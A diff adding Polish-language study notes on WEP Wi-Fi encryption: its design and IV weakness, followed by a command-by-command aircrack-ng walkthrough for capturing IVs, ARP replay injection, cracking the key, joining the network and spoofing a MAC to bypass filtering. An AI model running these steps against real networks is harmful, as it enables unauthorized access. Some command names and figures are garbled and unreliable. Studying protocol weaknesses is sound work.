@@ -1,0 +1,86 @@
+WEP-symetryczne
+
+(1) Budowa
+RC4 (poufność) + Crc-32 - suma kontrolna-integalność
+Długość klucza RC4 to 64 lub 128 bitów. Tekst jawny jest szyfrowany za pomocą XOR z kluczem.
+
+Podatny na ataki polegające na analizie danych zaszyfrowaych tym samym kluczem, dlatego klucz powinien być unikalny. Za względu na to, że klucz Rc4 jest krótki dodatko dla względów bezpieczeństwa tzw. wektor inicjujujący IV. Jest to 24 bitowa liczba, inna dla każdego transmitowanego pakietu. Jest ona konkatenowana z kluczem (stałym), przez co tworzy unikalny klucz dla każdego pakietu. Długość IV może wynosić 40 bitów dla Rc4 54 bitowego lub 104 bity dla Rc4 128 bitowego, stąd nazwy WEP-40 lub WEP-104.
+Klucz WEP zwykle podawany jest jako 10/26 cyfr hex. Kody Ascii ograniczają pulę kluczy.
+
+(2) Atak na WEP
+
+IV jako zmienny element klucza miał zapiepieczyć wysyłane dane przed złamania przez analizę dużej ilość pakietów, jednak ponieważ IV jest zmienny, strona odbierająca także musi znać wartość IV aby dane odszyfrować. Wobec tego jest on wysyłany tekstem jawnym, w niezaszyfrowanej części pakietu. 
+W przypadku sieci z 24bitową przestrzenią iv przy zgromedzeniu 5000 pakietów pr. kolizji z paradoksu urodzinego wynosi 50%.  Gdy IV powtórzy się, dane są szyfrowane tym samym kluczem, więc jest powrót do punktu wyjścia. 
+
+z pr 50% można odtworzyć 104bitowy klucz już z 40k pakietów. Dla 85k pakietów pr = 95%. Klucz 40-bitowy poddaje się już po 20k. Łamanie klucza odbywa się szybko.
+
+Podjęto więc próby eliminacji słabych IV (łatwo w nich odnaleźć zależności między wyjściem rc4 a konkretnymi bajtami klucza) lub stosowanie dłuższych IV. jednak to nic nie da -> aby klucz rc4 był bezpieczny, klucz usiałby być często zmieniany, a w sieciach WEP jest on wprowadzany ręcznie do kazdego urządzenia w sieci, przez co staje się to logistycznie niemożliwe w dużych sieciach.
+
+(3) Uwierzytelnianie dostępu do sieci
+
+W WEP istnieją dwie metody uwierztelniania przed dołączeniem do sieci (1) otwarta oraz (2) współdzielonego klucza.
+
+(1) wszystki urządzenia znające SSID mogą się podłączyć w sumie bezpieczeństwo zerowe
+(2) uwierzytelnienie (udowodnienie znajomości hasła) przez challengre response (protokół pyta, urządzenie odpowiada)
+
+
+(4) Gdyby trudno było zebrać odpowiednią ilość pakietów do ataku na WEP, można wygenerować sztuczny ruch wstrzykując pakiety samemu tzn. wysyłać do sieci nieodszfrowane pakiety tak, by wymusić na niej generowanie nowych. Nadaje się do tego protokoł ARP odpowiedzialny za translację adresów IP na MAC w sieci lokanej, ponieważ jego żądania wysyłane są na adres rozgłoszeniowy i mają stałą długość 68 bajtów. Można je wiec łatwo przechwycić i odesłać, zwłaszcza że jest ich dużo - bez konieczności deszyfrowania. Jeden i ten sam pakiet można wysłać dowolną ilość razy
+
+
+(5) Atak praktyczny
+- zebranie minimum 40k pakietow dla kluca wep104 (ew iniekcja)
+
+Analiza sieci w otoczeniu (tryb monitor)
+airmon-ng stop wlan1
+airmon-ng start wlan1
+airodump-ng mon0
+
+zbieranie pakietów z iv:
+airmon-ng stop mon0 // dla wszystkich sieci, wybieram tylko dla jednego kanalu
+airmon-ng start wlan1 kanal_sieci
+
+
+przechwytywanie
+airdump-ng -c 11 --bssid _bssidodczytany_ -w  _essidodczytany_ mon0
+widzimy aktualne zebrane IV
+
+wstrzykiwanie pakietow
+aby ap przyjęło pakiety, musimy podszyć się pod klienta podłączonego do sieci. W tym celu naley uwierzytelnić i podłączyć swój adres MAC pod adres innego klienta w sieci albo wykonać fałszywe przylączenie dowolnego MAC z którego będę wstrzykiwane pakiety (w ap musi być jednak co najmniej jeden prawdziwy klient, aby przechwyicić jego żądania arp). Każda kopia przechwyconego arp będzie geerowała nowy iv.fałszywe przyłączenie istnieje tylko dla modelu otwartej sieci, dla współdzielonego klucza nie da się wstrzykiwać pakietów w ogóle.Iniekcja w trybie minitor.
+
+test czy nasza karta i jej sterownik pozwalają na wstrzykiwania pakietów
+aireplay-ng -9 -e "nazwa sieci" -a "bssid sieci" mon0
+- fałszywa asocjacja - sprawi ze AP będzie akceptował pakiety z mojej karty sieciowej
+
+airplay-ng -1 0 -e "ssid sieci" -a "bssidsieci" "moj mac" mon0
+
+nasłuch odpowiedniego arp:
+aireplay-ng -3 -b "bssid" -h "mojmac" mon0
+
+poczeka a potem wstrzykuje z prędkością 500 pakietów na sekundę.
+Gdy znamy mac jakiegoś użytkownika sieci zamiast asocjacji możemy podszyć się pod niego w procesie wstrzykiwnaia.
+
+ŁAMANIE HASŁA
+aircrack-ng -s -b "bssid" wep-test*.cap
+proces trwa kilkadziesiąt sekund. gdy za mało pakietów, program wyświetli alert i poczeka na zwiększenie ich ilości. Łamanie rozpoczyna się co kolejne 5000 zebranych pakietów.
+
+PODŁĄCZENIE SIĘ DO SIECI
+dwa scenariusze, w zależności od tego czy wdrożono filtrowanie MAC czy nie
+1) jeśli nie, wystarczy wpisać
+airmon-ng stop mon0
+iwconfig wlan1 essid "nazwasieci" key: s:klucz
+iwconfig wlan1
+
+dhclient wlan1
+ifconfig wlan1
+
+
+2) jeżeli filtowane są adresy MAC, trzeba znać dopuszczalny adres. Nasłuchując przy pomocy airodump-ng można znaleźć autoryzowane urzędzenie, a potem zmienić swój MAC na jego.
+I powtórzyć powyższe.
+
+ZMIANA MAC
+ifconfig wlan1 down
+ifconfig wlan1 hw ether ustawiany_mac
+ifconfig wlan1 up
+
+
+Nie da się naprawić błędów WEP, ponieważ został on źle zaprojektowany. Dlatego uważany jest przez IEEE za przestarzały, jego używanie jest oficjalne odradzane, a jego następcą jest WPA.
